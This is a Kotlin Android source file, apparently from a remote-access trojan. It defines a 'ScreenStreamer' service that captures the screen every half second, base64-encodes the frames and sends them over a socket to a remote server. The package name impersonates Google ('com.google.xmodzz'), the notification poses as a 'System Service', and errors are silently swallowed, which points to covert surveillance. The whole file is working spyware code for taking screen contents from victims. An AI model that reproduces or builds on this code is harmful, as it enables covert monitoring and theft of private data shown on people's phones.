package com.google.xmodzz

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class ScreenStreamer : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var isStreaming = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            val resultCode = intent?.getIntExtra("resultCode", 0) ?: 0
            val data = intent?.getParcelableExtra<Intent>("data")
            if (resultCode != 0 && data != null) startCapture(resultCode, data)
        } catch (e: Exception) {
            stopSelf()
        }
        return START_STICKY
    }

    private fun startCapture(resultCode: Int, data: Intent) {
        try {
            if (isStreaming) return
            isStreaming = true

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel("ScreenChannel", "Screen Capture", NotificationManager.IMPORTANCE_LOW)
                (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
                val notif = NotificationCompat.Builder(this, "ScreenChannel")
                    .setContentTitle("System Service")
                    .setSmallIcon(android.R.drawable.stat_notify_sync).build()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(3, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                } else {
                    startForeground(3, notif)
                }
            }

            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mpm.getMediaProjection(resultCode, data)

            val metrics = DisplayMetrics()
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(metrics)

            val width = 480
            val height = (metrics.heightPixels * (480f / metrics.widthPixels)).toInt()
            val density = metrics.densityDpi

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null
            )

            val handler = Handler(Looper.getMainLooper())
            val runnable = object : Runnable {
                override fun run() {
                    if (!isStreaming) return
                    captureFrame()
                    handler.postDelayed(this, 500)
                }
            }
            handler.post(runnable)

        } catch (e: Exception) {
            isStreaming = false
            stopSelf()
        }
    }

    private fun captureFrame() {
        val image = imageReader?.acquireLatestImage() ?: return
        try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * image.width

            val bitmap = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height, Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)

            val cropped = Bitmap.createBitmap(bitmap, 0, 0, image.width, image.height)
            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos)
            val base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)

            val payload = JSONObject()
            payload.put("action", "screen_frame")
            payload.put("data", base64)

            // PAKAI SOCKET HOLDER (bukan bikin socket sendiri)
            if (SocketHolder.socket != null && SocketHolder.socket!!.connected()) {
                SocketHolder.socket!!.emit("device-data", payload)
            }

            bitmap.recycle()
            cropped.recycle()
        } catch (e: Exception) {
        } finally {
            try { image.close() } catch (e: Exception) {}
        }
    }

    override fun onDestroy() {
        isStreaming = false
        try {
            virtualDisplay?.release()
            imageReader?.close()
            mediaProjection?.stop()
        } catch (e: Exception) { }
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context, resultCode: Int, data: Intent) {
            try {
                val i = Intent(ctx, ScreenStreamer::class.java)
                i.putExtra("resultCode", resultCode)
                i.putExtra("data", data)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (e: Exception) { }
        }

        fun stop(ctx: Context) {
            try {
                ctx.stopService(Intent(ctx, ScreenStreamer::class.java))
            } catch (e: Exception) { }
        }
    }
}
